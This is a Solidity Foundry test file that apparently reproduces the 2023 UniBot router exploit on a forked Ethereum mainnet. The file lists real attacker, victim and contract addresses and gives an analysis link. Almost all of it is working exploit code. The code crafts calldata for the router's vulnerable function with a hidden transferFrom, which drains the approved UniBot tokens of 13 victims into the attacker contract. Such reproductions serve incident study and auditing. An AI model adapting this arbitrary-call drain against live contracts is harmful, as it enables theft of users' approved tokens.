// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "./interface.sol";

// @KeyInfo -- Total Lost : ~83,994 USD$
// Attacker : https://etherscan.io/address/0x413e4fb75c300b92fec12d7c44e4c0b4faab4d04
// Attack Contract : https://etherscan.io/address/0x2b326a17b5ef826fa4e17d3836364ae1f0231a6f
// Attacker Transaction : 
// https://etherscan.io/tx/0xcbe521aea28911fe9983030748028e12541e347b8b6b974d026fa5065c22f0cf


// @Analysis
// https://twitter.com/PeckShieldAlert/status/1719251390319796477

interface IUniBotRouter {

}

// The hacker sent multiple transactions to attack, just taking the first transaction as an example.

contract IUniBotRouterExploit is Test {
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    IUniBotRouter router = IUniBotRouter(0x126c9FbaB3A2FCA24eDfd17322E71a5e36E91865);
    IERC20 UniBot = IERC20(0xf819d9Cb1c2A819Fd991781A822dE3ca8607c3C9);
    WETH9 WETH = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    struct BuyParams {
        uint256 v0;
        uint256 v1;
        bool v2;
        uint256 v3;
        bytes v4;
        uint256 v5;

    }

    function setUp() public {
        cheats.createSelectFork("https://rpc.ankr.com/eth",18467805);

        cheats.label(address(router), "UniBotRouter");
        cheats.label(address(UniBot), "UniBot Token");
    }

    function testExploit() public {

        emit log_named_decimal_uint("Attacker UniBot balance before exploit", UniBot.balanceOf(address(this)), UniBot.decimals());

        address[] memory victims = new address[](13);
        victims[0] = 0xA20Cb17D888b7E426A3a7Ca2E583706dE48a04f3;
        victims[1] = 0x0d2FC413c1bEEB51f0c91a851Cb27421bccC75aC;
        victims[2] = 0x2004DE74c1c41A6943f364508f2e1a2390D0C9f9;
        victims[3] = 0x9a74A98Df43c085D89c6311746fe5C9D989982e5;
        victims[4] = 0x2004DE74c1c41A6943f364508f2e1a2390D0C9f9;
        victims[5] = 0xA6C9dA49553bcfec4633F4a0B81FBb4255F590fB;
        victims[6] = 0x4E19e37187Ca00F8eD8B6Ad258c6CaD823AA67b4;
        victims[7] = 0x2004DE74c1c41A6943f364508f2e1a2390D0C9f9;
        victims[8] = 0x97508F07D974FB02B79bf26bBa7bCE96E0e0985A;
        victims[9] = 0xB03b67cBae72c26CB262e5299a7FBC44A3f9D60A;
        victims[10] = 0xEEE050e1C0644364Ba53872f096Ba4F8088eA22F;
        victims[11] = 0x8523e886556CF1Bb539afF13d339cb1f3F9ecB25;
        victims[12] = 0x8a1Ee663e8Cd3F967D1814657A8858246ED31444;

        bytes4 vulnFunctionSignature = hex"b2bd16ab";
        address[] memory first_param = new address[](4);
        first_param[0] = address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE);
        first_param[1] = address(UniBot);
        first_param[2] = address(UniBot);
        first_param[3] = address(UniBot);
        for (uint i = 0; i < victims.length; i++) {
            uint256 allowance = UniBot.allowance(victims[i], address(router));
            uint256 balance = UniBot.balanceOf(victims[i]);
            balance = allowance < balance ? allowance : balance;
            bytes memory transferFromData = abi.encodeWithSignature("transferFrom(address,address,uint256)", victims[i], address(this), balance);
            bytes memory data = abi.encodeWithSelector(vulnFunctionSignature, first_param,0,true,100_000, transferFromData,new address[](1));
            (bool success,bytes memory result) = address(router).call(data);

        }
        uint256 UniBotBalance = UniBot.balanceOf(address(this));
        emit log_named_decimal_uint("Attacker UniBot balance after exploit", UniBotBalance , UniBot.decimals());
    }

}